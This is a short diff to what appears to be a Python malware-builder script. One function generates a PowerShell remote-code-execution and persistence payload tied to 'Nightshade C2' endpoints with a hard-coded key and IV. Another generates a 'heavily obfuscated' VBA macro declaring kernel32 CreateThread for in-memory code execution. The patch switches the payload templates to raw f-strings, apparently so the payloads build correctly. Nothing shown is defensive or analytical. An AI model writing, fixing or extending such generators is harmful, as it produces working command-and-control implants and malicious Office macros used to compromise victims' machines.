@@ -272,7 +272,7 @@ try {{
 
 def create_rce_persistence_payload(c2_server):
     """Create RCE with persistence payload using Nightshade C2 endpoints"""
-    rce_payload = f'''
+    rce_payload = fr'''
 $key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
 $iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')
 
@@ -373,7 +373,7 @@ Establish-RCE
 
 def create_embedded_macro():
     """Create heavily obfuscated VBA macro"""
-    vba_code = f'''
+    vba_code = fr'''
 Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
     ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As LongPtr, _
     ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
